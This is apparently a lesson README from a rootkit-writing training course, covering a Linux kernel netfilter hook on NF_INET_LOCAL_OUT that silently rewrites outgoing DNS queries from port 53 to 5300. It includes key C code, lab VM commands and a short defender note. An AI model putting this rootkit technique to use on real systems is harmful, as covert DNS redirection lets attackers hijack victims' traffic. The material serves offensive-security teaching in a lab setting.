# 47 - DNS spoof

## What we are learning

Rootkits intercept DNS queries to redirect victims to attacker-controlled
servers. By hooking `NF_INET_LOCAL_OUT`, a module can modify outgoing
UDP packets in transit, changing their destination port to redirect
traffic.

This ling demonstrates real packet modification: outgoing DNS queries
(UDP to port 53) are redirected to port 5300.

## The concept

```
  Normal DNS query:

  app --> UDP :53 --> DNS server --> response

  With this hook:

  app --> UDP :53 --> LOCAL_OUT hook --> UDP :5300 --> your listener
                        |
                        v
                   dest port rewritten
                   checksum zeroed

  The app thinks it sent to :53.
  Your listener on :5300 receives it.
```

## What we are doing

Register a hook on `NF_INET_LOCAL_OUT`, identify UDP packets destined
for port 53 on localhost, and rewrite the destination port to 5300.

## Includes you need

```c
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/skbuff.h>
```

## Key code

After matching the packet, make the skb writable and modify the port:

```c
if (skb_ensure_writable(skb, hdr_len + sizeof(*udph)))
    return NF_ACCEPT;

// Re-acquire pointers after ensure_writable
iph = ip_hdr(skb);
udph = (struct udphdr *)((u8 *)iph + iph->ihl * 4);

udph->dest = htons(SPOOF_PORT);
udph->check = 0;  // recalculate or zero the checksum
```

`skb_ensure_writable` is required because the skb data may be shared.

## Output format

```
spoofed=N
redirect_port=5300
```

## Try it

```bash
./rootkitlings run --network
```

Inside the VM:

```sh
insmod hello.ko
cat /proc/rk_spoofer                       # spoofed=0
echo test | nc -u -w1 127.0.0.1 53    # UDP to DNS port
cat /proc/rk_spoofer                       # spoofed counter changed
dmesg | tail
rmmod hello
```

## Contract

The check script verifies:

- `/proc/rk_spoofer` contains `spoofed=N` and `redirect_port=5300`.
- UDP packets to port 53 are redirected to port 5300.
- `spoofed` counter increments for each redirected packet.
- `/proc/rk_spoofer` disappears after unload.

## Verify

```bash
./rootkitlings check 47
```

The check starts a listener on port 5300, sends a UDP packet to port 53,
and verifies the packet was redirected to 5300.

> **What a defender sees**: an `NF_INET_LOCAL_OUT` hook modifying UDP
> packets is a strong indicator. `tcpdump` shows the rewritten port.

See also: [48 - TCP backdoor](../48-tcp-backdoor/README.md).
